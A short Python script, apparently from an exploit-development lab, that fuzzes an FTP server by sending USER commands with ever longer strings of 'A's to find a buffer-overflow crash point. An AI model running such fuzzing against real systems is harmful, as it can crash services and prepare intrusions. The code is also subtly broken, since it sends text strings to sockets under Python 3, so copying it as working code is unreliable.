#!/usr/bin/env python3
import sys, socket, time

host = '10.2.0.50'
port = 21
length = 100 #Initial length of 100 A's
while (length < 3001):
   client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Declare TCP Socket
   client.connect((host, port)) #connect to host and port
   client.recv(1024) # 1024 bits for receiving FTP banner
   client.send("user " + "A" * length) #send user command with string of A's
   client.recv(1024) # Grab reply from server
   client.send("PASS pass") #send pass as password to complete attempt (will fail)
   client.recv(1024) # Grab failed reply from server
   client.close() # Close connection so we can try again
   time.sleep(2) # Sleep for 2 seconds so we dont DOS the server
   print ('Sent: ', length)
   length += 100
